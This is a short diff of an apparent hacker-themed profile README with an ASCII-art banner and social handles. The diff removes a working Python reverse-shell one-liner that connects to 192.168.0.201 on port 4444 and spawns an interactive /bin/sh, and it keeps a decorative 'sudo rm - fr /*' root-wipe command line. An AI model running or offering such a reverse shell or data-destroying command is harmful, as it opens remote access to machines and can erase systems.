@@ -1,4 +1,4 @@
-<pre align="center">
+<pre style="margin-left: 334px; color: rgb(102, 102, 102);">
         
  _______          _________                 ______   _______          
 (       )|\     /|\__   __/|\     /|       (  __  \ (  ____ \|\     /|
@@ -14,19 +14,10 @@
 
  //Instagram: @thehackerworld_
  //e-mail: miton0030@gmail.com
- 
  //Telegram: @myth_dev
  //Instagram: mython_dev
  
-import socket,subprocess,os;
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
-s.connect(("192.168.0.201",4444));
-os.dup2(s.fileno(),0);
-os.dup2(s.fileno(),1);
-os.dup2(s.fileno(),2);
-p=subprocess.call(["/bin/sh","-i"]);
-
-root@myth:~# sudo rm - fr /*
+ root@myth:~# sudo rm - fr /*
 </pre>
 
 <p align='center'
